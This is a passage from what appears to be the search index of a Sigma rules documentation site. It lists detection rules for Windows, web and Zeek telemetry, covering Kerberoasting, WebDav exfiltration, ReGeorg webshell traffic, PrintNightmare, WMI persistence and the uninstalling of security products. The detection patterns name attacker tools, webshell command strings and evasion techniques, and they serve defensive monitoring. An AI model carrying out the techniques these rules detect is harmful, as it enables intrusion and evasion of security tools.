https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/ Raw rule (edit) title: Weak Encryption Enabled and Kerberoast id: f6de9536-0441-4b3f-a646-f4e00f300ffd status: test description: Detects scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking. author: \u0026#39;@neu5ron\u0026#39; references: - https://adsecurity.org/?p=2053 - https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/ date: 2017/07/30 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : Account Management \u0026gt; Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management\u0026#39; detection: selection: EventID: 4738 # According to Microsoft, the bit values are listed here: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720 # However, that seems to be a simple copy from https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties # and the actual flags that are used are quite different and, unfortunately, not documented. # https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/ contains a number of EVTX files with relevant events, which can be used to extract # the following values. olduac_des: # 0x8000 OldUacValue|endswith: - 8??? - 9??? - A??? - B??? - C??? - D??? - E??? - F??? newuac_des: NewUacValue|endswith: - 8??? - 9??? - A??? - B??? - C??? - D??? - E??? - F??? olduac_preauth: # 0x10000 OldUacValue|endswith: - 1???? - 3???? - 5???? - 7???? - 9???? - B???? - D???? - F???? newuac_preauth: NewUacValue|endswith: - 1???? - 3???? - 5???? - 7???? - 9???? - B???? - D???? - F???? olduac_encrypted: # 0x800 OldUacValue|endswith: - 8?? - 9?? - A?? - B?? - C?? - D?? - E?? - F?? newuac_encrypted: NewUacValue|endswith: - 8?? - 9?? - A?? - B?? - C?? - D?? - E?? - F?? condition: selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted)) falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_alert_enable_weak_encryption.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Weak Encryption Enabled and Kerberoast"},{"categories":null,"contents":"A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration.\nKnown false-positives unknown References https://github.com/OTRF/detection-hackathon-apt29/issues/17 Raw rule (edit) title: WebDav Put Request id: 705072a5-bb6f-4ced-95b6-ecfa6602090b status: test description: A General detection for WebDav user-agent being used to PUT files on a WebDav network share. This could be an indicator of exfiltration. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://github.com/OTRF/detection-hackathon-apt29/issues/17 date: 2020/05/02 modified: 2021/11/27 logsource: product: zeek service: http detection: selection: user_agent|contains: \u0026#39;WebDAV\u0026#39; method: \u0026#39;PUT\u0026#39; filter: id.resp_h: - 192.168.0.0/16 - 172.16.0.0/12 - 10.0.0.0/8 condition: selection and not filter falsepositives: - unknown level: low tags: - attack.exfiltration - attack.t1048.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_http_webdav_put_request.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"WebDav Put Request"},{"categories":null,"contents":"Certain strings in the uri_query field when combined with null referer and null user agent can indicate activity associated with the webshell ReGeorg.\nKnown false-positives web applications that use the same URL parameters as ReGeorg References https://community.rsa.com/community/products/netwitness/blog/2019/02/19/web-shells-and-netwitness-part-3 https://github.com/sensepost/reGeorg Raw rule (edit) title: Webshell ReGeorg Detection Via Web Logs id: 2ea44a60-cfda-11ea-87d0-0242ac130003 status: experimental description: Certain strings in the uri_query field when combined with null referer and null user agent can indicate activity associated with the webshell ReGeorg. author: Cian Heasley date: 2020/08/04 modified: 2021/11/23 references: - https://community.rsa.com/community/products/netwitness/blog/2019/02/19/web-shells-and-netwitness-part-3 - https://github.com/sensepost/reGeorg logsource: category: webserver detection: selection: cs-uri-query|contains: - \u0026#39;cmd=read\u0026#39; - \u0026#39;connect\u0026amp;target\u0026#39; - \u0026#39;cmd=connect\u0026#39; - \u0026#39;cmd=disconnect\u0026#39; - \u0026#39;cmd=forward\u0026#39; filter: cs-referer: null cs-User-Agent: null cs-method: POST condition: selection and filter fields: - cs-uri-query - cs-referer - cs-method - cs-User-Agent falsepositives: - web applications that use the same URL parameters as ReGeorg level: high tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/win_webshell_regeorg.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Webshell ReGeorg Detection Via Web Logs"},{"categories":null,"contents":"Detects unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder\u0026rsquo;s content (i.e. renaming files) without changing them on disk.\nKnown false-positives Read only access list authority References https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/ Raw rule (edit) title: Windows Network Access Suspicious desktop.ini Action id: 35bc7e28-ee6b-492f-ab04-da58fcf6402e status: test description: Detects unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder\u0026#39;s content (i.e. renaming files) without changing them on disk. author: Tim Shelton (HAWK.IO) references: - https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/ date: 2021/12/06 modified: 2022/01/16 logsource: product: windows service: security detection: selection: EventID: 5145 ObjectType: File RelativeTargetName|endswith: \u0026#39;\\desktop.ini\u0026#39; AccessList|contains: - \u0026#39;WriteData\u0026#39; - \u0026#39;DELETE\u0026#39; - \u0026#39;WriteDAC\u0026#39; - \u0026#39;AppendData\u0026#39; - \u0026#39;AddSubdirectory\u0026#39; condition: selection falsepositives: - Read only access list authority level: medium tags: - attack.persistence - attack.t1547.009 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_net_share_obj_susp_desktop_ini.yml/","tags":["attack.persistence","attack.t1547.009"],"title":"Windows Network Access Suspicious desktop.ini Action"},{"categories":null,"contents":"Detects the use of various web request POST or PUT methods (including aliases) via Windows PowerShell command\nKnown false-positives legitim script References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.md https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2 Raw rule (edit) title: Windows PowerShell Upload Web Request id: d2e3f2f6-7e09-4bf2-bc5d-90186809e7fb status: experimental description: Detects the use of various web request POST or PUT methods (including aliases) via Windows PowerShell command references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1020/T1020.md - https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2 author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: \u0026#39;Script block logging must be enabled\u0026#39; detection: selection_cmdlet: ScriptBlockText|contains: - \u0026#39;Invoke-WebRequest\u0026#39; - \u0026#39;iwr \u0026#39; selection_method: ScriptBlockText|contains: \u0026#39;-Method \u0026#39; selection_verb: - \u0026#39; Put \u0026#39; - \u0026#39; Post \u0026#39; condition: all of selection_* falsepositives: - legitim script level: medium tags: - attack.exfiltration - attack.t1020 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_upload.yml/","tags":["attack.exfiltration","attack.t1020"],"title":"Windows PowerShell Upload Web Request"},{"categories":null,"contents":"Detect DLL Load from Spooler Service backup folder\nKnown false-positives Loading of legitimate driver References https://github.com/hhlxf/PrintNightmare https://github.com/ly4k/SpoolFool Raw rule (edit) title: Windows Spooler Service Suspicious Binary Load id: 02fb90de-c321-4e63-a6b9-25f4b03dfd14 status: experimental description: Detect DLL Load from Spooler Service backup folder references: - https://github.com/hhlxf/PrintNightmare - https://github.com/ly4k/SpoolFool author: FPT.EagleEye, Thomas Patzke (improvements) date: 2021/06/29 modified: 2022/02/09 logsource: category: image_load product: windows detection: selection: Image|endswith: \u0026#39;spoolsv.exe\u0026#39; ImageLoaded|contains: - \u0026#39;\\Windows\\System32\\spool\\drivers\\x64\\3\\\u0026#39; - \u0026#39;\\Windows\\System32\\spool\\drivers\\x64\\4\\\u0026#39; ImageLoaded|endswith: \u0026#39;.dll\u0026#39; condition: selection falsepositives: - Loading of legitimate driver level: informational tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574 - cve.2021.1675 - cve.2021.34527 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_spoolsv_dll_load.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.t1574","cve.2021.1675","cve.2021.34527"],"title":"Windows Spooler Service Suspicious Binary Load"},{"categories":null,"contents":"Detect DLL deletions from Spooler Service driver folder\nKnown false-positives Unknown References https://github.com/hhlxf/PrintNightmare https://github.com/cube0x0/CVE-2021-1675 Raw rule (edit) title: Windows Spooler Service Suspicious File Deletion id: 5b2bbc47-dead-4ef7-8908-0cf73fcbecbf status: experimental description: Detect DLL deletions from Spooler Service driver folder references: - https://github.com/hhlxf/PrintNightmare - https://github.com/cube0x0/CVE-2021-1675 author: Bhabesh Raj date: 2021/07/01 modified: 2021/08/24 tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574 - cve.2021.1675 logsource: category: file_delete product: windows detection: selection: Image|endswith: \u0026#39;spoolsv.exe\u0026#39; TargetFilename|contains: \u0026#39;C:\\Windows\\System32\\spool\\drivers\\x64\\3\\\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_delete/file_delete_win_cve_2021_1675_printspooler_del.yml/","tags":["attack.persistence","attack.defense_evasion","attack.privilege_escalation","attack.t1574","cve.2021.1675"],"title":"Windows Spooler Service Suspicious File Deletion"},{"categories":null,"contents":"Detects code execution via the Windows Update client (wuauclt)\nKnown false-positives Unknown References https://dtm.uk/wuauclt/ Raw rule (edit) title: Windows Update Client LOLBIN id: d7825193-b70a-48a4-b992-8b5b3015cc11 status: experimental description: Detects code execution via the Windows Update client (wuauclt) references: - https://dtm.uk/wuauclt/ author: FPT.EagleEye Team date: 2020/10/17 modified: 2021/11/18 tags: - attack.command_and_control - attack.execution - attack.t1105 - attack.t1218 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - \u0026#39;/UpdateDeploymentProvider\u0026#39; - \u0026#39;/RunHandlerComServer\u0026#39; - \u0026#39;.dll\u0026#39; Image|endswith: - \u0026#39;\\wuauclt.exe\u0026#39; filter: CommandLine|contains: - \u0026#39; /ClassId \u0026#39; - \u0026#39; wuaueng.dll \u0026#39; condition: selection and not filter falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wuauclt.yml/","tags":["attack.command_and_control","attack.execution","attack.t1105","attack.t1218"],"title":"Windows Update Client LOLBIN"},{"categories":null,"contents":"Windows Update get some error Check if need a 0-days KB\nKnown false-positives unknown Raw rule (edit) title: Windows Update Error id: 13cfeb75-9e33-4d04-b0f7-ab8faaa95a59 status: experimental description: Windows Update get some error Check if need a 0-days KB author: frack113 date: 2021/12/04 logsource: product: windows service: system definition: Other error are in Microsoft-Windows-WindowsUpdateClient/Operational detection: selection: Provider_Name: Microsoft-Windows-WindowsUpdateClient EventID: - 16 # Unable to Connect: Windows is unable to connect to the automatic updates service and therefore cannot download and install updates according to the set schedule - 20 # Installation Failure: Windows failed to install the following update with error - 24 # Uninstallation Failure: Windows failed to uninstall the following update with error - 213 # Revert Failure: Windows failed to revert the following update with error - 217 # Commit Failure: Windows failed to commit the following update with error condition: selection falsepositives: - unknown level: low tags: - attack.impact - attack.resource_development - attack.t1584 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_susp_system_update_error.yml/","tags":["attack.impact","attack.resource_development","attack.t1584"],"title":"Windows Update Error"},{"categories":null,"contents":"Detects specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities\nKnown false-positives Unlikely References https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/ Raw rule (edit) title: Winnti Malware HK University Campaign id: 3121461b-5aa0-4a41-b910-66d25524edbb status: test description: Detects specific process characteristics of Winnti malware noticed in Dec/Jan 2020 in a campaign against Honk Kong universities author: Florian Roth, Markus Neis references: - https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/ date: 2020/02/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: ParentImage|contains: - \u0026#39;C:\\Windows\\Temp\u0026#39; - \u0026#39;\\hpqhvind.exe\u0026#39; Image|startswith: \u0026#39;C:\\ProgramData\\DRM\u0026#39; selection2: ParentImage|startswith: \u0026#39;C:\\ProgramData\\DRM\u0026#39; Image|endswith: \u0026#39;\\wmplayer.exe\u0026#39; selection3: ParentImage|endswith: \u0026#39;\\Test.exe\u0026#39; Image|endswith: \u0026#39;\\wmplayer.exe\u0026#39; selection4: Image: \u0026#39;C:\\ProgramData\\DRM\\CLR\\CLR.exe\u0026#39; selection5: ParentImage|startswith: \u0026#39;C:\\ProgramData\\DRM\\Windows\u0026#39; Image|endswith: \u0026#39;\\SearchFilterHost.exe\u0026#39; condition: 1 of selection* falsepositives: - Unlikely level: critical tags: - attack.defense_evasion - attack.t1574.002 - attack.g0044 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_winnti_mal_hk_jan20.yml/","tags":["attack.defense_evasion","attack.t1574.002","attack.g0044"],"title":"Winnti Malware HK University Campaign"},{"categories":null,"contents":"Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nKnown false-positives Unknow References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm https://github.com/Hackplayers/evil-winrm Raw rule (edit) title: WinRM Access with Evil-WinRM id: a197e378-d31b-41c0-9635-cfdf1c1bb423 status: experimental description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm - https://github.com/Hackplayers/evil-winrm date: 2022/01/07 logsource: category: process_creation product: windows detection: selection_mstsc: Image|endswith: \\ruby.exe CommandLine|contains|all: - \u0026#39;-i \u0026#39; - \u0026#39;-u \u0026#39; - \u0026#39;-p \u0026#39; condition: 1 of selection_* falsepositives: - Unknow level: medium tags: - attack.lateral_movement - attack.t1021.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_evil_winrm.yml/","tags":["attack.lateral_movement","attack.t1021.006"],"title":"WinRM Access with Evil-WinRM"},{"categories":null,"contents":"Detects Winword.exe loading of custmom dll via /l cmd switch\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherMSBinaries/Winword.yml Raw rule (edit) title: Winword.exe Loads Suspicious DLL id: 2621b3a6-3840-4810-ac14-a02426086171 status: test description: Detects Winword.exe loading of custmom dll via /l cmd switch author: Victor Sergeev, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OtherMSBinaries/Winword.yml date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: image_path: Image|endswith: \u0026#39;\\winword.exe\u0026#39; cmd: CommandLine|contains: \u0026#39;/l\u0026#39; condition: image_path and cmd fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_winword_dll_load.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Winword.exe Loads Suspicious DLL"},{"categories":null,"contents":"Detects the WMI Event Consumer service scrcons.exe creating a named pipe\nKnown false-positives Unknown References https://github.com/RiccardoAncarani/LiquidSnake Raw rule (edit) title: WMI Event Consumer Created Named Pipe id: 493fb4ab-cdcc-4c4f-818c-0e363bd1e4bb status: experimental description: Detects the WMI Event Consumer service scrcons.exe creating a named pipe references: - https://github.com/RiccardoAncarani/LiquidSnake date: 2021/09/01 author: Florian Roth logsource: product: windows category: pipe_created definition: \u0026#39;Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config, https://github.com/olafhartong/sysmon-modular. How to test detection? You can check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\u0026#39; detection: selection: Image|endswith: \u0026#39;\\scrcons.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.t1047 - attack.execution ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_susp_wmi_consumer_namedpipe.yml/","tags":["attack.t1047","attack.execution"],"title":"WMI Event Consumer Created Named Pipe"},{"categories":null,"contents":"Detects WMI command line event consumers\nKnown false-positives Unknown (data set is too small; further testing needed) References https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ Raw rule (edit) title: WMI Persistence - Command Line Event Consumer id: 05936ce2-ee05-4dae-9d03-9a391cf2d2c6 status: test description: Detects WMI command line event consumers author: Thomas Patzke references: - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ date: 2018/03/07 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image: \u0026#39;C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\u0026#39; ImageLoaded|endswith: \u0026#39;\\wbemcons.dll\u0026#39; condition: selection falsepositives: - Unknown (data set is too small; further testing needed) level: high tags: - attack.t1546.003 - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_wmi_persistence_commandline_event_consumer.yml/","tags":["attack.t1546.003","attack.persistence"],"title":"WMI Persistence - Command Line Event Consumer"},{"categories":null,"contents":"Detects file writes of WMI script event consumer\nKnown false-positives Dell Power Manager (C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe) References https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ Raw rule (edit) title: WMI Persistence - Script Event Consumer File Write id: 33f41cdd-35ac-4ba8-814b-c6a4244a1ad4 status: test description: Detects file writes of WMI script event consumer author: Thomas Patzke references: - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ date: 2018/03/07 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: Image: \u0026#39;C:\\WINDOWS\\system32\\wbem\\scrcons.exe\u0026#39; condition: selection falsepositives: - Dell Power Manager (C:\\Program Files\\Dell\\PowerManager\\DpmPowerPlanSetup.exe) level: high tags: - attack.t1546.003 - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_wmi_persistence_script_event_consumer_write.yml/","tags":["attack.t1546.003","attack.persistence"],"title":"WMI Persistence - Script Event Consumer File Write"},{"categories":null,"contents":"An adversary might use WMI to check if a certain Remote Service is running on a remote device. When the test completes, a service information will be displayed on the screen if it exists. A common feedback message is that \u0026ldquo;No instance(s) Available\u0026rdquo; if the service queried is not running. A common error message is \u0026ldquo;Node - (provided IP or default) ERROR Description =The RPC server is unavailable\u0026rdquo; if the provided remote host is unreacheable\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic Raw rule (edit) title: WMI Reconnaissance List Remote Services id: 09af397b-c5eb-4811-b2bb-08b3de464ebf status: experimental description: | An adversary might use WMI to check if a certain Remote Service is running on a remote device. When the test completes, a service information will be displayed on the screen if it exists. A common feedback message is that \u0026#34;No instance(s) Available\u0026#34; if the service queried is not running. A common error message is \u0026#34;Node - (provided IP or default) ERROR Description =The RPC server is unavailable\u0026#34; if the provided remote host is unreacheable author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\WMIC.exe CommandLine|contains|all: - \u0026#39;/node:\u0026#39; - service condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmic_remote_service.yml/","tags":["attack.execution","attack.t1047"],"title":"WMI Reconnaissance List Remote Services"},{"categories":null,"contents":"Detects signs of the WMI script host process %SystemRoot%\\system32\\wbem\\scrcons.exe functionality being used via images being loaded by a process.\nKnown false-positives Unknown References https://twitter.com/HunterPlaybook/status/1301207718355759107 https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/ https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html Raw rule (edit) title: WMI Script Host Process Image Loaded id: b439f47d-ef52-4b29-9a2f-57d8a96cb6b8 status: test description: Detects signs of the WMI script host process %SystemRoot%\\system32\\wbem\\scrcons.exe functionality being used via images being loaded by a process. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://twitter.com/HunterPlaybook/status/1301207718355759107 - https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/ - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html date: 2020/09/02 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: \u0026#39;\\scrcons.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\vbscript.dll\u0026#39; - \u0026#39;\\wbemdisp.dll\u0026#39; - \u0026#39;\\wshom.ocx\u0026#39; - \u0026#39;\\scrrun.dll\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.privilege_escalation - attack.persistence - attack.t1546.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_scrcons_imageload_wmi_scripteventconsumer.yml/","tags":["attack.lateral_movement","attack.privilege_escalation","attack.persistence","attack.t1546.003"],"title":"WMI Script Host Process Image Loaded"},{"categories":null,"contents":"Detects WMI spawning PowerShell\nKnown false-positives AppvClient CCM References https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e Raw rule (edit) title: WMI Spawning Windows PowerShell id: 692f0bec-83ba-4d04-af7e-e884a96059b6 status: experimental description: Detects WMI spawning PowerShell references: - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml - https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e author: Markus Neis / @Karneades date: 2019/04/03 modified: 2021/02/24 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\wmiprvse.exe\u0026#39; Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; filter_null1: CommandLine: \u0026#39;null\u0026#39; filter_null2: # some backends need the null value in a separate expression CommandLine: null condition: selection and not filter_null1 and not filter_null2 falsepositives: - AppvClient - CCM level: high tags: - attack.execution - attack.t1047 - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmi_spwns_powershell.yml/","tags":["attack.execution","attack.t1047","attack.t1059.001"],"title":"WMI Spawning Windows PowerShell"},{"categories":null,"contents":"Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the /FORMAT argument switch to download and execute an XSL file (i.e js, vbs, etc).\nKnown false-positives Apparently, wmic os get lastboottuptime loads vbscript.dll References https://securitydatasets.com/notebooks/small/windows/05_defense_evasion/SDWIN-201017061100.html https://twitter.com/dez_/status/986614411711442944 https://lolbas-project.github.io/lolbas/Binaries/Wmic/ Raw rule (edit) title: WMIC Loading Scripting Libraries id: 06ce37c2-61ab-4f05-9ff5-b1a96d18ae32 status: test description: Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc). author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - https://securitydatasets.com/notebooks/small/windows/05_defense_evasion/SDWIN-201017061100.html - https://twitter.com/dez_/status/986614411711442944 - https://lolbas-project.github.io/lolbas/Binaries/Wmic/ date: 2020/10/17 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: \u0026#39;\\wmic.exe\u0026#39; ImageLoaded|endswith: - \u0026#39;\\jscript.dll\u0026#39; - \u0026#39;\\vbscript.dll\u0026#39; condition: selection falsepositives: - Apparently, wmic os get lastboottuptime loads vbscript.dll level: high tags: - attack.defense_evasion - attack.t1220 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_wmic_remote_xsl_scripting_dlls.yml/","tags":["attack.defense_evasion","attack.t1220"],"title":"WMIC Loading Scripting Libraries"},{"categories":null,"contents":"Detects deinstallation of security products using WMIC utility\nKnown false-positives Legitimate administration References https://twitter.com/cglyer/status/1355171195654709249 https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/ Raw rule (edit) title: Wmic Uninstall Security Product id: 847d5ff3-8a31-4737-a970-aeae8fe21765 description: Detects deinstallation of security products using WMIC utility references: - https://twitter.com/cglyer/status/1355171195654709249 - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/ date: 2021/01/30 modified: 2021/10/18 status: experimental author: Florian Roth tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;wmic\u0026#39; - \u0026#39;product where name=\u0026#39; - \u0026#39;call uninstall\u0026#39; - \u0026#39;/nointeractive\u0026#39; selection_product: CommandLine|contains: - \u0026#39;Antivirus\u0026#39; - \u0026#39;AVG \u0026#39; - \u0026#39;Crowdstrike Sensor\u0026#39; - \u0026#39;DLP Endpoint\u0026#39; - \u0026#39;Endpoint Detection\u0026#39; - \u0026#39;Endpoint Protection\u0026#39; - \u0026#39;Endpoint Security\u0026#39; - \u0026#39;Endpoint Sensor\u0026#39; - \u0026#39;ESET File Security\u0026#39; - \u0026#39;Malwarebytes\u0026#39; - \u0026#39;McAfee Agent\u0026#39; - \u0026#39;Microsoft Security Client\u0026#39; - \u0026#39;Threat Protection\u0026#39; - \u0026#39;VirusScan\u0026#39; - \u0026#39;Webroot SecureAnywhere\u0026#39; - \u0026#39;Windows Defender\u0026#39; condition: selection and selection_product falsepositives: - Legitimate administration level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_wmic_security_product_uninstall.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Wmic Uninstall Security Product"},{"categories":null,"contents":"Detects suspicious file execution by wscript and cscript\nKnown false-positives Unlikely References https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf Raw rule (edit) title: WMIExec VBS Script id: 966e4016-627f-44f7-8341-f394905c361f status: test description: Detects suspicious file execution by wscript and cscript author: Florian Roth references: - https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf date: 2017/04/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains|all: - \u0026#39;.vbs\u0026#39; - \u0026#39;/shell\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.execution - attack.g0045 - attack.t1059.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_cloudhopper.yml/","tags":["attack.execution","attack.g0045","attack.t1059.005"],"title":"WMIExec VBS Script"},{"categories":null,"contents":"Detects a threat actor creating a file named wbemcomn.dll in the C:\\Windows\\System32\\wbem\\ directory over the network and loading it for a WMI DLL Hijack scenario.\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html Raw rule (edit) title: Wmiprvse Wbemcomn DLL Hijack id: 614a7e17-5643-4d89-b6fe-f9df1a79641c description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\\Windows\\System32\\wbem\\` directory over the network and loading it for a WMI DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/09/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 references: - https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html logsource: product: windows category: file_event detection: selection: Image: System TargetFilename|endswith: \u0026#39;\\wbem\\wbemcomn.dll\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_wmiprvse_wbemcomn_dll_hijack.yml/","tags":["attack.execution","attack.t1047","attack.lateral_movement","attack.t1021.002"],"title":"Wmiprvse Wbemcomn DLL Hijack"},{"categories":null,"contents":"Detects a threat actor creating a file named wbemcomn.dll in the C:\\Windows\\System32\\wbem\\ directory over the network and loading it for a WMI DLL Hijack scenario.\nKnown false-positives Unknown References 